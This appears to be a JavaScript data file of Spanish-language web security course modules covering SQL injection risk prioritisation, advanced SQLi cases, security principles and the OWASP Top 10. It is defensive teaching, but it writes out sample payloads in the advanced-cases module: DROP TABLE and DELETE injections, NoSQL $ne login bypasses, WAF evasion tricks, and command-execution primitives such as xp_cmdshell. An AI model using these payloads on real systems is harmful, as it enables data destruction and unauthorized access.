          <h2>Buenas prácticas operativas</h2>
          <ul>
            <li>Diagrama actualizado de arquitectura, flujos, puertos y roles de BD.</li>
            <li>Revisiones periódicas de permisos/usuarios y configuración de BD.</li>
            <li>Pruebas de penetración integrales (aplicación, red, BD, evasión de WAF).</li>
            <li>Plan de respuesta a incidentes: rotación de credenciales, contención, comunicación y forense.</li>
            <li>Security by Design en cada cambio arquitectónico; modelado de amenazas.</li>
            <li>Simplicidad cuando sea viable: menos caminos → menor superficie de ataque.</li>
          </ul>

          <h2>Resumen</h2>
          <p>
            La mitigación de la inyección SQL requiere un enfoque holístico: mínimo privilegio, segmentación, WAF/IDS/monitoreo, hardening y procesos operativos maduros. Si una capa falla, otras deben limitar el daño. Integrar estas medidas con la codificación segura reduce drásticamente la probabilidad y el impacto de un incidente.
          </p>
        `
      },
    'analisis-priorizacion-riesgo': {
      id: 'analisis-priorizacion-riesgo',
      title: 'Análisis y Priorización de Riesgos',
      description: 'Aprende a evaluar severidad según datos expuestos, privilegios y exposición pública, y a priorizar correcciones basadas en impacto y probabilidad.',
      category: 'sqli',
      htmlContent: `
          <h2>Introducción</h2>
          <p>
            No todas las vulnerabilidades son iguales ni tienen el mismo impacto. En este módulo aprenderemos a analizar el riesgo asociado a las inyecciones SQL y a priorizar las acciones necesarias para gestionarlas. Esto incluye comprender la probabilidad de que una vulnerabilidad sea explotada y el impacto potencial que podría tener sobre la organización.
          </p>
          <p>
            Abordaremos metodologías para calificar riesgos (como <strong>CVSS</strong> y <strong>OWASP Risk Rating</strong>), además de los factores clave a considerar: ¿Qué datos podrían extraerse? ¿Qué tan fácil es explotarla? ¿Qué controles existen que podrían mitigarla?
          </p>
          <p>
            Asimismo, veremos cómo encuadrar las SQLi dentro del panorama general de seguridad (por ejemplo, en el <strong>OWASP Top 10</strong>) y cómo comunicarlas a nivel gerencial para asegurar los recursos necesarios para su corrección. Finalmente, discutiremos cómo priorizar la remediación frente a otros problemas de seguridad o funcionales, basándonos en un análisis costo-beneficio y en el concepto de <em>nivel de riesgo aceptable</em>.
          </p>

          <h2>Explicación</h2>

          <h3>Entendiendo el Riesgo = Probabilidad × Impacto</h3>
          <p>Esta es la fórmula básica de la gestión de riesgos.</p>
          <ul>
            <li><strong>Probabilidad (Likelihood):</strong> depende de factores como la facilidad de descubrimiento (por ejemplo, si la vulnerabilidad se encuentra en una página pública o detrás de autenticación), la existencia de exploits conocidos o herramientas automatizadas (como <em>sqlmap</em>), y la necesidad o no de autenticación. También influye la exposición: una SQLi en una intranet accesible solo para empleados tiene una probabilidad menor de ser explotada por externos, pero aún puede ser aprovechada por amenazas internas.</li>
            <li><strong>Impacto:</strong> mide qué puede conseguir un atacante si explota la vulnerabilidad. Puede ir desde la lectura de datos no sensibles (impacto bajo) hasta el robo de información confidencial, obtención de credenciales de administrador o incluso la destrucción de la base de datos (impacto crítico).</li>
          </ul>
          <p>
            El impacto se evalúa en tres dimensiones:
            <ul>
              <li><strong>Confidencialidad:</strong> datos expuestos o filtrados.</li>
              <li><strong>Integridad:</strong> alteración o eliminación de registros.</li>
              <li><strong>Disponibilidad:</strong> interrupción del servicio o caída del sistema.</li>
            </ul>
          </p>
          <p>Por ejemplo, una SQLi que permita ejecutar <code>DROP TABLE</code> tiene un impacto alto en integridad y disponibilidad, mientras que una que solo lea datos no sensibles afecta moderadamente la confidencialidad.</p>

          <h3>Evaluación con CVSS</h3>
          <p>
            El <strong>Common Vulnerability Scoring System (CVSS)</strong> proporciona un marco estandarizado para puntuar vulnerabilidades. Una SQLi explotable remotamente suele tener:
          </p>
          <ul>
            <li>Attack Vector: <strong>Network</strong></li>
            <li>Attack Complexity: <strong>Low</strong></li>
            <li>Privileges Required: <strong>None</strong></li>
            <li>User Interaction: <strong>None</strong></li>
          </ul>
          <p>Si además compromete confidencialidad, integridad y disponibilidad, su puntaje final suele ser <strong>9.0 o superior (crítico)</strong>. De hecho, la mayoría de las CVE relacionadas con SQLi se califican entre <strong>7.5 y 10.0</strong>.</p>

          <h3>OWASP Top 10 y contexto</h3>
          <p>
            OWASP ha clasificado las <strong>inyecciones</strong> entre las principales amenazas desde hace más de una década. En el Top 10 de 2017 ocupaban el puesto #1, y en el de 2021 el #3, lo que demuestra su persistencia y gravedad.
          </p>
          <p>
            Las razones son claras:
            <ul>
              <li>Son <strong>fáciles de explotar</strong> (cualquier atacante con herramientas básicas puede intentarlo).</li>
              <li>Sus <strong>consecuencias son severas</strong> (filtración masiva de datos, pérdida de integridad o control total del sistema).</li>
            </ul>
          </p>
          <p>Casos emblemáticos como <strong>Equifax (2017)</strong> o <strong>Yahoo (2014)</strong> demuestran que una inyección mal gestionada puede causar pérdidas económicas y reputacionales catastróficas.</p>

          <h3>Análisis de escenarios específicos</h3>
          <ul>
            <li><strong>Datos expuestos:</strong> ¿Se almacenan datos personales, financieros o confidenciales?</li>
            <li><strong>Alcance del ataque:</strong> ¿Podría pivotear hacia otros sistemas?</li>
            <li><strong>Controles existentes:</strong> ¿Hay un WAF, monitoreo activo o roles SQL restrictivos?</li>
            <li><strong>Exposición:</strong> ¿Está en un servicio público o requiere autenticación interna?</li>
          </ul>
          <p>La conjunción de estos factores define la prioridad de corrección.</p>

          <h3>Priorización en la práctica</h3>
          <p>
            Las organizaciones suelen clasificar las vulnerabilidades como:
            <strong>Críticas</strong>, <strong>Altas</strong>, <strong>Medias</strong>, <strong>Bajas</strong> o <strong>Informativas</strong>.
          </p>
          <p>
            Una SQLi sin mitigaciones se considera <strong>Crítica</strong> y debe solucionarse de inmediato. Si no hay fix disponible, deben implementarse mitigaciones temporales como reglas específicas en el <strong>WAF</strong>, deshabilitar temporalmente la funcionalidad afectada o reforzar el monitoreo.
          </p>

          <h3>Costo-beneficio</h3>
          <p>
            Generalmente, las SQLi son <strong>baratas de corregir</strong> y <strong>muy costosas de ignorar</strong>. El costo de implementar consultas parametrizadas o validaciones es bajo, mientras que el impacto de una brecha puede ser devastador. En la mayoría de los casos, no hay justificación válida para posponer la corrección.
          </p>

          <h3>Aceptación de riesgo</h3>
          <p>
            En ocasiones puede ser necesario aceptar un riesgo residual, pero solo bajo condiciones muy controladas:
            <ul>
              <li>Existen mitigaciones efectivas (por ejemplo, la base no contiene datos sensibles y está aislada).</li>
              <li>El costo de reparación es extremadamente alto comparado con el impacto.</li>
              <li>El sistema afectado será reemplazado o retirado a corto plazo.</li>
            </ul>
            Toda aceptación debe documentarse formalmente, con responsables y plazos definidos.
          </p>

          <h3>Comunicación del riesgo</h3>
          <p>
            La comunicación efectiva a niveles no técnicos es esencial:
            <blockquote>
              “Existe una vulnerabilidad de inyección SQL que permite a un atacante obtener todos los datos de clientes sin autenticación. Esto equivale a un acceso directo como administrador a la base de datos. Tiene una severidad CVSS 9.1 (crítica) y debe corregirse en menos de una semana.”
            </blockquote>
          </p>
          <p>Este lenguaje es comprensible para la gerencia y ayuda a justificar recursos y priorización. También es importante vincularlo a <strong>riesgos regulatorios</strong> (GDPR, PCI-DSS) y <strong>daño reputacional</strong>.</p>

          <h3>Priorización frente a otras iniciativas</h3>
          <p>
            Es común que surja el dilema entre “lanzar una nueva funcionalidad” o “parchar una vulnerabilidad crítica”. Las buenas prácticas indican que <strong>la seguridad prevalece</strong>: un incidente grave puede detener por completo el negocio, mientras que una feature puede esperar.
          </p>

          <h3>Seguimiento y registro</h3>
          <p>
            Toda vulnerabilidad debe ingresarse en un <strong>registro de riesgos</strong> (risk register o bug tracker), asignando severidad, responsable, fecha de corrección prevista y mitigaciones temporales. Esto evita que los hallazgos se pierdan o queden sin seguimiento.
          </p>

          <h2>Casos de Estudio</h2>
          <h3>Caso 1 – SQLi en buscador público</h3>
          <ul>
            <li>Probabilidad: Alta (público y fácil de detectar).</li>
            <li>Impacto: Alto (exposición de usuarios y contraseñas cifradas).</li>
            <li>Mitigaciones: Ninguna.</li>
            <li>CVSS estimado: 9.1 (Crítico).</li>
            <li><strong>Prioridad:</strong> Crítica.</li>
            <li><strong>Acciones:</strong> Corregir en menos de 48 horas; aplicar regla WAF temporal; notificar al área de seguridad.</li>
          </ul>

          <h3>Caso 2 – SQLi en módulo interno administrativo</h3>
          <ul>
            <li>Probabilidad: Baja (requiere autenticación y acceso interno).</li>
            <li>Impacto: Alto (posible acceso extendido a datos).</li>
            <li>CVSS: 6.5 (Media).</li>
            <li><strong>Prioridad:</strong> Media.</li>
            <li><strong>Acciones:</strong> Programar fix en el siguiente sprint; mitigar temporalmente; monitorear uso del módulo.</li>
          </ul>

          <h3>Caso 3 – SQLi limitada por permisos</h3>
          <ul>
            <li>Probabilidad: Alta (detectable).</li>
            <li>Impacto: Bajo (no accede a datos sensibles).</li>
            <li><strong>Prioridad:</strong> Baja.</li>
            <li><strong>Acciones:</strong> Corregir en ciclo regular; mantener permisos restringidos.</li>
          </ul>

          <h3>Evaluación con OWASP Risk Rating</h3>
          <p>
            Este método combina factores cualitativos y cuantitativos:
            <ul>
              <li><strong>Amenaza:</strong> habilidad, motivos, oportunidades.</li>
              <li><strong>Vulnerabilidad:</strong> facilidad de descubrimiento, explotación y detección.</li>
              <li><strong>Impacto:</strong> financiero, reputacional, privacidad, cumplimiento.</li>
            </ul>
            Cada factor se puntúa del 0 al 9 y se obtiene un promedio que clasifica el riesgo en bajo, medio, alto o crítico.
          </p>

          <h2>Errores comunes</h2>
          <ul>
            <li>Subestimar la vulnerabilidad porque “nunca pasó nada”.</li>
            <li>Priorizar nuevas funciones sobre la seguridad.</li>
            <li>No reevaluar riesgos tras cambios de contexto.</li>
            <li>Confiar excesivamente en mitigaciones (como WAF o IDS).</li>
            <li>No involucrar a la gerencia en la toma de decisiones.</li>
          </ul>

          <h2>Buenas prácticas</h2>
          <ul>
            <li>Mantener un <strong>cuadro de riesgos</strong> actualizado con severidad, impacto y planes de acción.</li>
            <li>Establecer <strong>SLA de remediación</strong>: críticos ≤ 48h, altos ≤ 7 días, medios ≤ 30 días.</li>
            <li>Realizar <strong>simulaciones de impacto</strong> para justificar recursos.</li>
            <li>Implementar <strong>pentesting continuo</strong> o <strong>bug bounty</strong>.</li>
            <li>Cumplir con <strong>estándares y normativas</strong> (ISO 27001, PCI-DSS).</li>
            <li>Realizar <strong>lecciones aprendidas</strong> tras incidentes reales.</li>
          </ul>

          <h2>Resumen</h2>
          <p>
            El análisis y la priorización del riesgo permiten enfocar los esfuerzos de seguridad donde más importan. La <strong>inyección SQL</strong> suele clasificarse como un riesgo <strong>crítico</strong> debido a su facilidad de explotación y alto potencial de daño.
          </p>
          <p>
            El tratamiento debe basarse en criterios claros de <strong>probabilidad e impacto</strong>, apoyado en métricas estandarizadas (CVSS/OWASP). Además, debe comunicarse de manera efectiva a los responsables de negocio y gestionarse dentro de políticas formales de parches y seguimiento.
          </p>
          <p>
            El objetivo no es solo corregir la vulnerabilidad, sino <strong>construir un proceso continuo</strong> de gestión de riesgos que prevenga su reaparición y mantenga la seguridad como prioridad estratégica.
          </p>
        `
      },
    'casos-avanzados-sqli': {
      id: 'casos-avanzados-sqli',
      title: 'Casos avanzados y consideraciones modernas',
      description: 'Analiza escenarios complejos como SQL dinámico, procedimientos almacenados, limitaciones de ORMs y riesgos comparativos en bases NoSQL, con estrategias para mitigarlos.',
      category: 'sqli',
      htmlContent: `
          <h2>Introducción</h2>
          <p>
            En este último módulo examinaremos <strong>casos avanzados de inyección SQL</strong>: escenarios menos comunes o más sofisticados que requieren un entendimiento profundo para ser prevenidos. Revisaremos conceptos como la <em>inyección de segundo orden</em>, variantes en entornos distintos a los típicos (por ejemplo, inyecciones en ORMs mal utilizados, inyecciones en bases de datos NoSQL, o inyecciones dentro de procedimientos almacenados dinámicos).
          </p>
          <p>
            También exploraremos técnicas de evasión que atacantes avanzados emplean para sortear filtros o WAFs, como la ofuscación de payloads SQL, el uso de funciones alternativas o la fragmentación de consultas. Asimismo, tocaremos la posibilidad de <strong>inyecciones combinadas</strong> (ataques multivector) y cómo las SQLi pueden abrir la puerta a compromisos más amplios del sistema, por ejemplo, ejecutar comandos del sistema operativo desde la base de datos o exfiltrar datos mediante llamadas DNS.
          </p>
          <p>
            El propósito es preparar al estudiante para reconocer y mitigar incluso las manifestaciones más complejas de esta amenaza, recordando que la mejor defensa sigue siendo aplicar los principios ya aprendidos —separación de código y datos, validación y parametrización— adaptados a cada contexto.
          </p>

          <h2>Explicación</h2>

          <h3>Inyección SQL de Segundo Orden</h3>
          <p>
            A diferencia de la SQLi "directa" (de primer orden), donde el atacante inyecta y obtiene resultados inmediatos, en la <strong>inyección de segundo orden</strong> el payload se almacena en la base de datos y se ejecuta posteriormente cuando otro proceso reutiliza ese dato en una nueva consulta.
          </p>
          <p>
            <strong>Ejemplo típico:</strong> un atacante registra un usuario con el nombre <code>'; DROP TABLE usuarios;--</code>. Este valor se guarda tal cual en la base (aún sin efecto dañino). Más tarde, un script de administración construye dinámicamente una consulta usando los nombres de usuario:
          </p>
          <pre>SELECT * FROM usuarios WHERE nombre IN (<lista de nombres>);</pre>
          <p>
            Si concatena los valores sin parametrización, al llegar al nombre malicioso, se cerrará la consulta y ejecutará el <code>DROP TABLE</code>.  
            También ocurre en foros o sistemas de búsqueda donde los datos almacenados se reutilizan en nuevas consultas SQL.
          </p>
          <p>
            <strong>Defensa:</strong> parametrizar incluso esas consultas internas, validar y escapar los datos antes de reusarlos. En general, tratar todos los datos almacenados (aunque provengan de la base) como no confiables si van a formar parte de nuevas consultas.
          </p>

          <h3>Inyecciones en entornos ORM</h3>
          <p>
            Aunque los <strong>ORMs</strong> ofrecen una capa de abstracción que reduce el riesgo de SQLi, pueden ser vulnerables si se usan incorrectamente.
          </p>
          <ul>
            <li>Ejemplo en Hibernate: <code>session.createQuery("FROM Producto WHERE categoria = '" + cat + "'")</code> es vulnerable.</li>
            <li>En Django, el uso de <code>.extra()</code> o <code>raw()</code> puede permitir SQL crudo no parametrizado.</li>
            <li>Pasar entrada del usuario a métodos como <code>order_by(raw(user_input))</code> reintroduce riesgo de inyección.</li>
          </ul>
          <p>
            Incluso con ORMs, los desarrolladores pueden construir cadenas manualmente o abusar de funciones “raw”. Los atacantes también pueden explotar características internas para forzar consultas costosas (denegación de servicio mediante queries pesadas).
          </p>
          <p>
            <strong>Defensa:</strong> usar los métodos del ORM que garantizan parametrización, evitar SQL crudo, y validar cualquier input usado para ordenar o filtrar dinámicamente.
          </p>

          <h3>Inyecciones NoSQL</h3>
          <p>
            Las bases de datos NoSQL (como MongoDB, Cassandra o Redis) no usan SQL, pero también pueden sufrir inyecciones.
          </p>
          <p><strong>Ejemplo MongoDB:</strong></p>
          <pre>db.users.find({ user: u, pass: p })</pre>
          <p>
            Si un atacante envía un objeto <code>{ "$ne": null }</code> como valor para <code>user</code> y <code>pass</code>, la consulta se convierte en:
          </p>
          <pre>{ user: { $ne: null }, pass: { $ne: null } }</pre>
          <p>
            Esto devuelve cualquier usuario, logrando un bypass de autenticación.
          </p>
          <p>
            <strong>Prevención:</strong> validar tipos de entrada (asegurarse de que los campos sean cadenas y no objetos), usar validación de esquema (como Mongoose o Joi), y deshabilitar interpretaciones automáticas de operadores ($ne, $regex, etc.) en entradas del usuario.
          </p>

          <h3>Inyecciones fuera de SQL convencional</h3>
          <p>
            El concepto de inyección se extiende más allá de SQL: LDAP, XPath, OGNL o incluso GraphQL pueden ser vulnerables si concatenan input en sus consultas.  
            Por ejemplo, una <em>GraphQL Injection</em> ocurre si un desarrollador permite fragments arbitrarios sin validación.  
            El patrón es universal: entrada del usuario + lenguaje interpretado + concatenación = riesgo.
          </p>

          <h3>Evasión de Filtros y WAFs</h3>
          <p>
            Los atacantes avanzados emplean diversas técnicas para evadir reglas básicas de detección:
          </p>
          <ul>
            <li><strong>Codificación de caracteres:</strong> usar <code>%27</code> en lugar de <code>'</code> (URL encoding), o Unicode equivalente.</li>
            <li><strong>Comentarios y espacios:</strong> insertar <code>/**/</code> para dividir palabras clave: <code>UNI/**/ON SEL/**/ECT</code>.</li>
            <li><strong>Consultas sin comillas:</strong> usar comparaciones numéricas (<code>OR 1=1</code>) o representaciones hexadecimales (<code>UNHEX(HEX(...))</code>).</li>
            <li><strong>Procedimientos peligrosos:</strong> ejecutar <code>xp_cmdshell</code> (MSSQL), <code>LOAD_FILE()</code> o <code>INTO OUTFILE</code> (MySQL).</li>
            <li><strong>Exfiltración DNS (OOB):</strong> uso de funciones como <code>xp_dirtree</code> o <code>UTL_INADDR</code> para sacar datos vía DNS o SMB.</li>
          </ul>
          <p>
            <strong>Defensa:</strong> no confiar en filtros por palabras clave, sino corregir la raíz del problema con consultas parametrizadas. Los WAF deben mantenerse actualizados y bien afinados, con revisiones frecuentes de sus firmas.
          </p>

          <h3>SQLi con Ejecución de Comandos del Sistema (RCE)</h3>
          <p>
            Algunas bases de datos permiten ejecutar comandos del sistema operativo, lo que convierte una SQLi en una <strong>ejecución remota de código</strong> (RCE).
          </p>
          <ul>
            <li>En MSSQL: <code>xp_cmdshell</code>.</li>
            <li>En PostgreSQL: <code>COPY TO PROGRAM</code>.</li>
            <li>En MySQL: creación de funciones UDF o escritura en archivos con <code>SELECT INTO OUTFILE</code>.</li>
          </ul>
          <p>
            Estas capacidades permiten a un atacante escalar de una inyección SQL a un control total del servidor.
          </p>

          <h3>Poliglotas y diferencias entre motores</h3>
          <p>
            Cada motor SQL tiene particularidades sintácticas:
            <ul>
              <li>Oracle requiere <code>FROM DUAL</code> para consultas sin tabla y maneja comentarios con <code>--</code> de manera diferente.</li>
              <li>MySQL necesita un espacio tras <code>--</code>.</li>
              <li>SQLite tiene limitaciones de multi-statement.</li>
            </ul>
            Los atacantes adaptan sus payloads según el motor. Por eso, las pruebas deben considerar la plataforma específica.
          </p>

          <h3>Herramientas avanzadas</h3>
          <p>
            Herramientas como <strong>sqlmap</strong> ofrecen funciones especializadas:
            <ul>
              <li><code>--second-order</code>: detección de inyecciones de segundo orden.</li>
              <li><strong>Tamper scripts</strong>: alteran payloads para evadir WAFs.</li>
            </ul>
            Es importante que los equipos defensivos conozcan estas opciones para evaluar su efectividad frente a ataques automatizados.
          </p>

          <h3>Mitigaciones modernas</h3>
          <p>
            Los frameworks y motores modernos integran medidas preventivas:
            <ul>
              <li>PostgreSQL: modo <code>sql_safe_updates</code> limita consultas destructivas sin <code>WHERE</code>.</li>
              <li>Bibliotecas modernas de acceso a datos exigen consultas parametrizadas.</li>
            </ul>
            Aun así, ninguna herramienta sustituye la responsabilidad del desarrollador de validar y parametrizar correctamente.
          </p>

          <h3>Casos límite (Edge Cases)</h3>
          <ul>
            <li><strong>HTTP Parameter Pollution (HPP):</strong> enviar un parámetro duplicado puede generar concatenaciones inesperadas que introduzcan caracteres peligrosos.</li>
            <li><strong>Problemas de codificación UTF-8:</strong> caracteres multibyte truncados pueden convertirse en comillas simples (<code>'</code>) y alterar la sintaxis.</li>
            <li><strong>Inyecciones ciegas sin logs:</strong> uso de consultas basadas en tiempo (por ejemplo, <code>SLEEP()</code>) para evitar dejar rastros en registros.</li>
          </ul>

          <h2>Ejemplos Avanzados</h2>

          <h3>Ejemplo 1: Inyección de segundo orden en aplicación real</h3>
          <p>
            Un sitio permite a los usuarios personalizar el título de su perfil. El título se muestra en una página donde un administrador puede filtrar usuarios por título.  
            Internamente, la herramienta del administrador ejecuta:
          </p>
          <pre>WHERE titulo LIKE '%<palabra>%'</pre>
          <p>
            Un atacante establece como título: <code>%'; DELETE FROM usuarios WHERE 'a'='a</code>.  
            Cuando el administrador busca “a”, la consulta se transforma en:
          </p>
          <pre>WHERE titulo LIKE '%'; DELETE FROM usuarios WHERE 'a'='a%'</pre>
          <p>
            Esto ejecuta el <code>DELETE</code> antes de producir un error de sintaxis. Resultado: todos los usuarios eliminados.
          </p>
          <p>
            <strong>Solución:</strong> usar consultas parametrizadas, validar los caracteres permitidos en el título y escapar los comodines (% y ').
          </p>

          <h3>Ejemplo 2: Bypass de filtrado básico</h3>
          <p>
            Si la aplicación bloquea la cadena “ or ”, un atacante puede usar:
            <ul>
              <li>“||” (en algunos motores actúa como OR o concatenación)</li>
              <li>Distinto casing: “Or”, “oR”</li>
              <li>Combinaciones: <code>' OR '1' like '1</code></li>
            </ul>
            <strong>Lección:</strong> los filtros de patrones son insuficientes; la única solución robusta es la parametrización.
          </p>

          <h3>Ejemplo 3: NoSQL Injection en login</h3>
          <pre>db.users.findOne({ name: req.body.name, pass: req.body.pass })</pre>
          <p>
            Si el atacante envía <code>name[$ne]=dummy</code> y <code>password[$ne]=dummy</code>, algunos frameworks antiguos lo traducen a:
          </p>
          <pre>{ name: { $ne: "dummy" }, password: { $ne: "dummy" } }</pre>
          <p>
            Lo que devuelve cualquier registro, permitiendo autenticación sin credenciales válidas.
          </p>
          <p>
            <strong>Prevención:</strong> validar que los campos sean strings, rechazar objetos, aplicar sanitización y usar validación de esquema.
          </p>

          <h3>Ejemplo 4: Ataque combinado (Polyglot)</h3>
          <p>
            Una aplicación vulnerable tanto a XSS como a SQLi puede sufrir un ataque multivector.  
            Por ejemplo, un atacante inyecta un script (XSS) que, al ser ejecutado por un administrador, realiza una petición AJAX maliciosa con payload SQLi a un endpoint interno.
          </p>
          <p>
            <strong>Lección:</strong> las vulnerabilidades se potencian entre sí. Mitigar todas las capas es esencial para evitar compromisos encadenados.
          </p>

          <h2>Resumen</h2>
          <p>
            Los casos avanzados de inyección SQL demuestran que los atacantes adaptan sus técnicas a nuevos entornos y tecnologías. Desde inyecciones de segundo orden hasta bypass de WAFs, procedimientos almacenados inseguros o ataques en bases NoSQL, el principio es siempre el mismo: <strong>falta de separación entre código y datos</strong>.
          </p>
          <p>
            La defensa efectiva sigue siendo aplicar de forma rigurosa la <strong>parametrización, validación y control de privilegios</strong>, complementadas con monitoreo, hardening y actualización continua. Entender estas variantes modernas permite anticiparse a vectores complejos y fortalecer la seguridad general de las aplicaciones.
          </p>
        `
      },
    'intro-seguridad': {
      id: 'intro-seguridad',
      title: 'Introducción a la Seguridad en Aplicaciones Web',
      description: 'Aprende los fundamentos esenciales de la seguridad web: defensa en profundidad, principio de mínimo privilegio, reducción de superficie de ataque y modelos de amenaza.',
      category: 'security-basics',
      htmlContent: `
      <h2>Introducción</h2>
      <p>
      Este módulo establece los pilares sobre los que se construyen todas las demás prácticas de seguridad vistas en el curso (como la prevención de inyección SQL, XSS o la arquitectura segura). Su propósito es ofrecer una comprensión completa de los principios fundamentales de la seguridad en aplicaciones web modernas: cómo pensar la seguridad desde el diseño, cómo limitar los daños cuando un fallo ocurre y cómo aplicar una mentalidad de defensa en profundidad.
      </p>

      <h2>Conceptos Fundamentales</h2>
      <ul>
        <li><strong>Seguridad como proceso continuo:</strong> No es un estado ni un producto; es una disciplina que acompaña todo el ciclo de vida del software (desde el diseño hasta la operación). El objetivo no es eliminar todos los riesgos, sino gestionarlos de forma efectiva.</li>
        <li><strong>Modelo CIA:</strong> Toda política o control de seguridad busca preservar tres propiedades:
          <ul>
            <li><em>Confidencialidad:</em> los datos solo deben ser accesibles a quien esté autorizado.</li>
            <li><em>Integridad:</em> la información no debe ser alterada de manera no autorizada o accidental.</li>
            <li><em>Disponibilidad:</em> los sistemas y servicios deben estar accesibles cuando se necesiten.</li>
          </ul>
        </li>
        <li><strong>Superficie de ataque:</strong> Es el conjunto total de puntos a través de los cuales un atacante podría interactuar con la aplicación o el sistema. Reducirla significa eliminar funcionalidades innecesarias, cerrar puertos, desactivar APIs o endpoints no usados y minimizar el código expuesto al usuario.</li>
        <li><strong>Principio de Mínimo Privilegio:</strong> Cada componente, servicio o usuario debe tener solo los permisos estrictamente necesarios para cumplir su función. Esto limita el impacto de una vulnerabilidad: si una inyección SQL ocurre, la cuenta de base de datos con permisos mínimos no podrá ejecutar comandos destructivos.</li>
        <li><strong>Defensa en profundidad:</strong> Consiste en establecer múltiples capas de protección que se refuercen entre sí. Si una capa falla (por ejemplo, la validación de entrada), otra (como la parametrización o el control de acceso a la BD) debe contener el daño. Una buena arquitectura no confía en una sola barrera.</li>
      </ul>

      <h2>Seguridad en el Ciclo de Vida del Software (SDLC)</h2>
      <p>
      La seguridad debe integrarse en cada fase del desarrollo, no añadirse al final. Cada etapa tiene sus responsabilidades:
      </p>
      <ol>
        <li><strong>Diseño:</strong> aplicar seguridad por diseño. Identificar activos críticos, modelar amenazas (p. ej. STRIDE o PASTA), y definir requisitos de seguridad. Evitar patrones peligrosos como ejecutar SQL dinámico o exponer datos sensibles por conveniencia.</li>
        <li><strong>Implementación:</strong> seguir guías de codificación segura: uso de consultas parametrizadas, validaciones en servidor, manejo correcto de errores y logs sin exponer información sensible. Revisar código (code review) enfocado en vulnerabilidades.</li>
        <li><strong>Pruebas:</strong> realizar auditorías de seguridad, pruebas de penetración y análisis estático (SAST) y dinámico (DAST). Probar comportamientos inesperados (inyecciones, inputs maliciosos, XSS, etc.).</li>
        <li><strong>Despliegue:</strong> asegurar la configuración de entornos (hardening de servidores, HTTPS, secretos en variables de entorno, deshabilitar módulos innecesarios).</li>
        <li><strong>Operación y monitoreo:</strong> registrar eventos relevantes, detectar anomalías (p. ej., múltiples errores SQL o intentos de login fallidos) y aplicar actualizaciones de seguridad de forma regular.</li>
      </ol>

      <h2>Principios Clave de Diseño Seguro</h2>
      <ul>
        <li><strong>Seguridad por defecto:</strong> toda funcionalidad debe ser segura sin configuración adicional (por ejemplo, denegar accesos por defecto y requerir reglas explícitas para permitirlos).</li>
        <li><strong>Fallar de forma segura:</strong> cuando algo sale mal, el sistema debe entrar en un estado seguro. Ejemplo: si una validación falla, se debe rechazar la solicitud, no procesarla parcialmente.</li>
        <li><strong>Separación de responsabilidades:</strong> el código de aplicación no debe tener privilegios de administración de base de datos; el servidor web no debe ejecutar comandos del sistema operativo.</li>
        <li><strong>Minimización de exposición:</strong> exponer solo la información estrictamente necesaria. No incluir versiones de software en cabeceras HTTP, ni mostrar trazas de error al cliente.</li>
        <li><strong>Auditoría y trazabilidad:</strong> toda acción relevante debe poder rastrearse. Esto no solo sirve para detectar ataques, sino también para demostrar cumplimiento.</li>
      </ul>

      <h2>Ejemplos Prácticos</h2>
      <ul>
        <li><strong>Buena práctica (parámetros seguros):</strong><br/>
        <code>SELECT * FROM users WHERE id = ?</code><br/>
        La consulta es segura porque separa datos de comandos.</li>
        <li><strong>Mala práctica (concatenación directa):</strong><br/>
        <code>"SELECT * FROM users WHERE id = " + userInput</code><br/>
        El valor del usuario forma parte del comando SQL, lo que abre la puerta a una inyección.</li>
        <li><strong>Fallar de forma insegura:</strong><br/>
        Mostrar <em>stack trace</em> con información interna al usuario. Ejemplo: “DatabaseException: error near SELECT on file db_conn.php:42”. Esto da pistas valiosas a un atacante.</li>
      </ul>

      <h2>Errores Comunes</h2>
      <ul>
        <li>Asumir que las aplicaciones internas no necesitan controles fuertes.</li>
        <li>Confiar en la validación del lado cliente y omitir la del servidor.</li>
        <li>Reutilizar credenciales administrativas para desarrollo y producción.</li>
        <li>No tener políticas claras de rotación de contraseñas y llaves API.</li>
        <li>Desestimar vulnerabilidades “porque nadie las ha explotado todavía”.</li>
      </ul>

      <h2>Buenas Prácticas</h2>
      <ul>
        <li><strong>Usar HTTPS siempre:</strong> protege la confidencialidad e integridad del tráfico (TLS 1.2 o superior).</li>
        <li><strong>Separar entornos:</strong> desarrollo, pruebas y producción deben ser independientes, con distintas credenciales y accesos.</li>
        <li><strong>Automatizar la revisión de dependencias:</strong> herramientas como OWASP Dependency-Check o npm audit ayudan a detectar librerías vulnerables.</li>
        <li><strong>Aplicar defensa en profundidad:</strong> parametrización + validación + permisos mínimos + monitoreo + WAF.</li>
        <li><strong>Educar al equipo:</strong> todos los desarrolladores deben comprender amenazas comunes (OWASP Top 10) y patrones de mitigación.</li>
      </ul>

      <h2>Resumen</h2>
      <p>
      La seguridad en aplicaciones web no depende de una sola técnica ni de una herramienta, sino de una mentalidad integral. Aplicar el principio de mínimo privilegio, la defensa en profundidad, y la seguridad desde el diseño crea sistemas más resilientes. Las vulnerabilidades como la inyección SQL o el XSS son consecuencias directas de romper estos principios. Entenderlos y aplicarlos correctamente es el primer paso hacia un desarrollo verdaderamente seguro.
      </p>
      `
    },
    'owasp-top-10': {
      id: 'owasp-top-10',
      title: 'OWASP Top 10',
      description: 'Conoce las diez vulnerabilidades más críticas según OWASP, su impacto en la seguridad de las aplicaciones web y las estrategias modernas para mitigarlas.',
      category: 'security-basics',
      htmlContent: `
      <h2>Introducción</h2>
      <p>
      El OWASP Top 10 es un proyecto mantenido por la Open Web Application Security Project, una comunidad global dedicada a mejorar la seguridad del software. Desde hace más de una década, el Top 10 se ha convertido en el estándar de facto para identificar las principales vulnerabilidades en aplicaciones web. No es simplemente una lista, sino una guía educativa que refleja las amenazas más comunes y graves observadas en miles de auditorías, pruebas de penetración y datos reales de incidentes de seguridad.
      </p>
      <p>
      Comprender cada categoría del OWASP Top 10 es esencial para cualquier profesional de desarrollo, seguridad o auditoría. Estas vulnerabilidades representan los errores más repetidos en la industria y sirven como punto de partida para establecer políticas, realizar revisiones de código y diseñar arquitecturas seguras.
      </p>

      <h2>Visión General del OWASP Top 10 (versión 2021)</h2>
      <p>
      La edición 2021 reagrupa algunas categorías, introduce nuevas (como “Software and Data Integrity Failures”) y refleja una visión más holística que abarca tanto defectos técnicos como fallas de diseño y gestión. A continuación se detalla cada una:
      </p>

      <h3>1. Broken Access Control (Control de acceso roto)</h3>
      <p>
      Se refiere a errores en la implementación de permisos, roles o restricciones de acceso. Un atacante puede acceder a datos o funciones que no debería. Ejemplos:
      </p>
      <ul>
        <li>Endpoints administrativos accesibles sin autenticación.</li>
        <li>Usuarios que pueden modificar parámetros (como <code>user_id</code>) y ver o alterar información de otros.</li>
      </ul>
      <p>
